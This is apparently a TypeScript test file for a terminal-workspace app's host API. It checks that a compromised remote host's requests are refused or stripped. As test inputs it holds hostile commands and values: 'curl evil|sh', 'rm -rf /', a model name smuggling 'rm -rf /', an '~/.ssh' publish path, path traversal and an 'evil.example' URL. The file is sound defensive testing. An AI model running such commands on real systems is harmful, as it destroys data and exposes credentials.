import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type Database from 'better-sqlite3';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { LOCAL_NODE_ID, NodeStore } from '../store/NodeStore.js';
import { PaneStore } from '../store/PaneStore.js';
import { TabStore } from '../store/TabStore.js';
import { WorkspaceStore } from '../store/WorkspaceStore.js';
import { openDb } from '../store/db.js';
import { HostApi } from './host-api.js';

/**
 * The surface a compromised host gets. Every `expect(404)` here is one of the
 * things the trust review priced: `startup_cmd` on a new pane, an app that
 * autostarts every boot, `/api/publish` with a path, typing into a live
 * terminal on the user's desk.
 */

let dir: string;
let db: Database.Database;
let fetched: Request[];
let api: HostApi;
let remote: { tab: string; paneId: string };
let local: { tab: string; paneId: string };

/** A fresh one per call — a Response body can only be read once. */
const ok = () =>
  new Response('{"ok":true}', { status: 200, headers: { 'content-type': 'application/json' } });

beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'muxpad-hostapi-'));
  db = openDb(join(dir, 'db.sqlite'));
  const nodes = new NodeStore(db);
  nodes.add({ id: 'trayo', name: 'VM', endpoint: 'ws://vm:7797' });
  const ws = new WorkspaceStore(db).create({ name: 'W' }).id;
  const mk = (nodeId: string) => {
    const tab = new TabStore(db).create({ name: 'T', layout: '', workspace_id: ws }).id;
    const paneId = new PaneStore(db).create({ tab_id: tab, shell: '/bin/zsh', cwd: '/tmp' }).id;
    db.prepare('UPDATE panes SET node_id = ? WHERE id = ?').run(nodeId, paneId);
    return { tab, paneId };
  };
  remote = mk('trayo');
  local = mk(LOCAL_NODE_ID);
  fetched = [];
  api = new HostApi({
    db,
    selfUrl: 'http://127.0.0.1:7777',
    apiKey: () => 'secret',
    fetch: (req) => {
      fetched.push(req);
      return ok();
    },
  });
});
afterEach(() => {
  db.close();
  rmSync(dir, { recursive: true, force: true });
});

describe('what a host may ask for', () => {
  it('passes a card write for its OWN chat', async () => {
    const res = await api.handle(
      'trayo',
      'PUT',
      `/api/tabs/${remote.tab}/cards/build`,
      '{"text":"x"}',
    );
    expect(res.status).toBe(200);
    expect(fetched).toHaveLength(1);
    const req = fetched[0] as Request;
    expect(new URL(req.url).pathname).toBe(`/api/tabs/${remote.tab}/cards/build`);
    // Headers are OURS: the install credential and a same-origin Origin,
    // nothing the host sent.
    expect(req.headers.get('x-muxpad-key')).toBe('secret');
    expect(req.headers.get('origin')).toBe('http://127.0.0.1:7777');
  });

  it('passes `agent send` to a pane on its own machine', async () => {
    const res = await api.handle(
      'trayo',
      'POST',
      `/api/agent-sessions/${remote.paneId}/send`,
      '{"text":"hi"}',
    );
    expect(res.status).toBe(200);
  });

  it('issues the say key, which carries no id to scope', async () => {
    expect((await api.handle('trayo', 'GET', '/api/say/key')).status).toBe(200);
  });
});

describe('what it may not', () => {
  const refused = async (method: string, path: string, body?: string) => {
    const res = await api.handle('trayo', method, path, body);
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  };

  it('refuses another machine’s chat — the host-scoping rule, enforced', () =>
    refused('PUT', `/api/tabs/${local.tab}/cards/build`, '{"text":"x"}'));

  it('refuses `agent send` to a pane on the mac', () =>
    refused('POST', `/api/agent-sessions/${local.paneId}/send`, '{"text":"hi"}'));

  it('refuses a pane it has never heard of — unknown is not ours', () =>
    refused('POST', '/api/agent-sessions/pGhost/send', '{"text":"hi"}'));

  it('refuses a pane that spawns a command', () =>
    refused('POST', `/api/tabs/${remote.tab}/panes`, '{"startup_cmd":"curl evil|sh"}'));

  it('refuses an app that would autostart every boot', () =>
    refused('POST', '/api/apps', '{"command":"evil"}'));

  it('refuses publishing a path', () => refused('POST', '/api/publish', '{"path":"~/.ssh"}'));

  it('refuses typing into a terminal', () =>
    refused('POST', `/api/panes/${local.paneId}/input`, '{"data":"rm -rf /\\n"}'));

  it('refuses a cron that survives reboots', () => refused('POST', '/api/crons', '{}'));

  it('refuses the index page, which hands out the install secret in a cookie', () =>
    refused('GET', '/'));

  it('refuses traversal dressed as a card name', () =>
    refused('PUT', `/api/tabs/${remote.tab}/cards/..%2F..%2Fapps`, '{}'));

  it('refuses a query string on an allowed shape, rather than passing it on', () =>
    refused('GET', '/api/say/key?x=1'));

  it('refuses a host calling itself `local`', async () => {
    const res = await api.handle('local', 'GET', '/api/say/key');
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  });
});

describe('the path that is dispatched', () => {
  it('is rebuilt from validated captures, not taken from the host', async () => {
    // A trailing-encoded separator that `exec` tolerates must not survive.
    await api.handle('trayo', 'GET', `/api/tabs/${remote.tab}/cards/mar%6Bet`);
    const req = fetched[0] as Request;
    // Decoded once, then rebuilt — so the router sees a plain name.
    expect(new URL(req.url).pathname).toBe(`/api/tabs/${remote.tab}/cards/market`);
  });

  it('reports a refusal identically whatever was asked, so nothing is probed', async () => {
    const a = await api.handle('trayo', 'POST', '/api/apps', '{}');
    const b = await api.handle('trayo', 'GET', `/api/tabs/${local.tab}/cards`);
    expect(a).toEqual(b);
  });
});

describe('spawning a worker', () => {
  it('is allowed from one of its OWN chats, pinned to its own machine', async () => {
    const res = await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({
        bootstrap: 'agent',
        spawned_by_pane: remote.paneId,
        backend: 'claude',
        mode: 'chat',
        name: 'read the build log',
        cwd: '/home/ohad/work',
      }),
    );
    expect(res.status).toBe(200);
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.node_id).toBe('trayo');
    expect(sent.spawned_by_pane).toBe(remote.paneId);
    expect(sent.bootstrap).toBe('agent');
    expect(sent.cwd).toBe('/home/ohad/work');
  });

  it('is refused with no parent — the parent IS the authorisation', async () => {
    const res = await api.handle('trayo', 'POST', '/api/tabs', JSON.stringify({ cwd: '/tmp' }));
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  });

  it('is refused when the parent is a chat on the mac', async () => {
    // Otherwise a host names someone else's chat and gets a worker on this
    // machine, in that conversation's own tree.
    const res = await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({ spawned_by_pane: local.paneId }),
    );
    expect(res.status).toBe(404);
    expect(fetched).toHaveLength(0);
  });

  it('drops every field it does not know, today or after someone extends the route', async () => {
    await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({
        spawned_by_pane: remote.paneId,
        startup_cmd: 'curl evil | sh',
        workspace_id: 'w-somewhere-else',
        layout: { kind: 'leaf' },
        icon: '💀',
      }),
    );
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.startup_cmd).toBeUndefined();
    expect(sent.workspace_id).toBeUndefined();
    expect(sent.layout).toBeUndefined();
    expect(sent.icon).toBeUndefined();
  });

  it('refuses a model that could carry shell syntax, rather than passing it', async () => {
    await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({ spawned_by_pane: remote.paneId, model: 'opus; rm -rf /' }),
    );
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.model).toBeUndefined();
  });

  it('refuses a relative cwd — that is not a directory on any machine', async () => {
    await api.handle(
      'trayo',
      'POST',
      '/api/tabs',
      JSON.stringify({ spawned_by_pane: remote.paneId, cwd: '../../etc' }),
    );
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.cwd).toBeUndefined();
  });

  it('lets the host read back the tab it just made, to address the worker', async () => {
    const res = await api.handle('trayo', 'GET', `/api/tabs/${remote.tab}`);
    expect(res.status).toBe(200);
  });

  it('refuses reading a tab on the mac', async () => {
    const res = await api.handle('trayo', 'GET', `/api/tabs/${local.tab}`);
    expect(res.status).toBe(404);
  });
});

describe('publishing from a host', () => {
  const withFetch = (
    impl: (
      nodeId: string,
      path: string,
    ) => Promise<{ path: string; dispose: () => void } | { error: string }>,
  ) => {
    const disposed: string[] = [];
    const a = new HostApi({
      db,
      selfUrl: 'http://127.0.0.1:7777',
      apiKey: () => 'secret',
      fetch: (req) => {
        fetched.push(req);
        return ok();
      },
      fetchFromHost: impl,
    });
    return { a, disposed };
  };

  it('publishes the STAGED path, never the host’s', async () => {
    let askedFor = '';
    const { a } = withFetch(async (_n, p) => {
      askedFor = p;
      return { path: '/Users/ohadpr/.muxpad/host-staging/x/report.html', dispose: () => {} };
    });
    const res = await a.handle(
      'trayo',
      'POST',
      '/api/publish',
      JSON.stringify({ path: '/home/ohad/work/report.html', name: 'weekly' }),
    );
    expect(res.status).toBe(200);
    // The host's path names what to FETCH and reaches publish not at all —
    // the route's filesystem reasoning (is this the public dir, is it an
    // ancestor of it) cannot usefully stat another machine's path.
    expect(askedFor).toBe('/home/ohad/work/report.html');
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.path).toBe('/Users/ohadpr/.muxpad/host-staging/x/report.html');
    expect(sent.name).toBe('weekly');
  });

  it('deletes the staging tree whatever publish did', async () => {
    let gone = false;
    const { a } = withFetch(async () => ({
      path: '/tmp/staged',
      dispose: () => {
        gone = true;
      },
    }));
    await a.handle('trayo', 'POST', '/api/publish', JSON.stringify({ path: '/home/ohad/x' }));
    expect(gone).toBe(true);
  });

  it('drops a base url the host suggested, so the link is the durable one', async () => {
    const { a } = withFetch(async () => ({ path: '/tmp/staged', dispose: () => {} }));
    await a.handle(
      'trayo',
      'POST',
      '/api/publish',
      JSON.stringify({ path: '/home/ohad/x', public_base_url: 'https://evil.example' }),
    );
    const sent = JSON.parse(await (fetched[0] as Request).text()) as Record<string, unknown>;
    expect(sent.public_base_url).toBeUndefined();
  });

  it('refuses a relative path without asking the host for anything', async () => {
    let asked = false;
    const { a } = withFetch(async () => {
      asked = true;
      return { error: 'x' };
    });
    const res = await a.handle('trayo', 'POST', '/api/publish', JSON.stringify({ path: 'rel' }));
    expect(res.status).toBe(404);
    expect(asked).toBe(false);
  });

  it('reports a failed transfer as 502, not as a publish that worked', async () => {
    const { a } = withFetch(async () => ({ error: 'that machine is not connected' }));
    const res = await a.handle('trayo', 'POST', '/api/publish', JSON.stringify({ path: '/x' }));
    expect(res.status).toBe(502);
    expect(res.body).toContain('not connected');
    expect(fetched).toHaveLength(0);
  });

  it('is refused outright when the link has no file channel', async () => {
    // `fetchFromHost` absent = publishing from a host is simply not on the
    // list, which is the right default rather than a half-working path.
    const res = await api.handle('trayo', 'POST', '/api/publish', JSON.stringify({ path: '/x' }));
    expect(res.status).toBe(404);
  });
});

describe('a router that throws', () => {
  // The rejection is deliberate: HostLink.answerApi is the one place that
  // turns it into a 500, because that is also where "no handler at all" has to
  // become a refusal. Swallowing it here would hide a server bug as a 500 with
  // no log line.
  it('rejects, for HostLink to turn into a refusal the pane can see', async () => {
    const boom = new HostApi({
      db,
      selfUrl: 'http://127.0.0.1:7777',
      apiKey: () => null,
      fetch: vi.fn(() => {
        throw new Error('nope');
      }),
    });
    await expect(boom.handle('trayo', 'GET', '/api/say/key')).rejects.toThrow('nope');
  });
});
